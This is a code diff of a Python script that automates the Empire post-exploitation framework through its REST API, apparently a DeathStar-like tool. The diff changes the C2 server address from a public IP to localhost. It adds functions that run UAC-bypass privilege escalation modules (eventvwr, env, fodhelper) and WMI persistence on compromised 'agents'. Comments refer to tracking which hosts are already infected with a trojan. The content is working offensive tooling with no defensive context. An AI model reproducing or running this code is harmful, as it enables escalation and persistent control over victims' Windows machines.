@@ -16,8 +16,10 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 __version__ = '0.0.1'
 
-base_url = "https://139.162.51.108:1337"
+base_url = "https://127.0.0.1:1337"
 headers = {'Content-Type': 'application/json'}
+listener = 'YouListener'
+
 
 class KThread(threading.Thread):
     """
@@ -74,8 +76,8 @@ def login(empire_username, empire_password):
         print_bad('Connection Error. Check Empire RESTful API')
         sys.exit(1)
 
-def get_listener_by_name(token, listener_name = "DeathStar"):
-    r = requests.get(base_url+'/api/listeners/{}'.format(listener_name), params = token , verify = False)
+def get_listener_by_name(token):
+    r = requests.get(base_url+'/api/listeners/{}'.format(listener), params = token , verify = False)
     if r.status_code == 200:
         return r.json()
     return False
@@ -168,7 +170,7 @@ def execute_module_with_results(module_name, agent_name, module_options = None):
 
 
 # 这里明明只有执行一次。
-def execute_module(module_name, agent_name, module_options=None):    #执行一个模块
+def execute_module(token,module_name, agent_name, module_options=None):    #执行一个模块
     payload = {'Agent': agent_name}
     if module_options:
         payload.update(module_options)
@@ -212,19 +214,31 @@ def get_agent_logged_events(agent_name):
 
 # 执行bypassuac_eventvwr提权
 # 提权成功会返回一个新的agent会话
-def bypassuac_eventvwr(agent_name, listener='DeathStar'):
+def bypassuac_eventvwr(token,agent_name, listener):
     module_options = {"Listener": listener}
 
     print_info('Attempting to elevate using bypassuac_eventvwr', agent_name)
-    execute_module('powershell/privesc/bypassuac_eventvwr', agent_name, module_options)
+    execute_module(token,'powershell/privesc/bypassuac_eventvwr', agent_name, module_options)
+    
+def bypassuac_env(token,agent_name, listener):
+    module_options = {"Listener": listener}
+    
+    print_info('Attempting to elevate using bypassuac_env', agent_name)
+    execute_module(token,'powershell/privesc/bypassuac_env', agent_name, module_options)
+    
+    
+def bypassuac_fodhelper(token,agent_name, listener):
+    module_options = {"Listener": listener}
+    print_info('Attempting to elevate using bypassuac_fodhelper', agent_name)
+    execute_module(token,'powershell/privesc/bypassuac_fodhelper', agent_name, module_options)
     
 # 增加是否中过木马的判断，主机名和用户名都相同的情况来判断。
 # 由于模块自身问题，会触发两次。
-def persistence_elevated_wmi(agent_name, listener='DeathStar'):
+def persistence_elevated_wmi(token,agent_name, listener):
     module_options = {'Listener': listener}
     
     print_info('Attempting to persistence', agent_name)
-    execute_module('powershell/persistence/elevated/wmi', agent_name, module_options)
+    execute_module(token,'powershell/persistence/elevated/wmi', agent_name, module_options)
     verify_string = agents[agent_name]['hostname'] + agents[agent_name]['username']
     persisted_host.append(persisted)
 
